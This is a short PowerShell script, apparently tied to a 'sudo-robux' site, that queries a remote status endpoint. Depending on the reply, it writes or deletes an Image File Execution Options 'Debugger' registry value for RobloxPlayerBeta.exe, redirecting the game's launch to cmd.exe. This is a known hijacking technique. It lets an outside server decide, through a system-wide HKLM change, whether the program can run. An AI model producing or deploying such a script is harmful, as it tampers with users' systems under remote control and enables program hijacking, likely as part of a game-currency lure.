$status = Invoke-RestMethod -Uri "https://sudo-robux.vercel.app/status" -Method Get -UseBasicParsing -ErrorAction Stop
Write-Host $status

if ($status) {
	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RobloxPlayerBeta.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\cmd.exe" /f
}
else {
	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RobloxPlayerBeta.exe" /f
	.\RobloxPlayerBeta.exe
}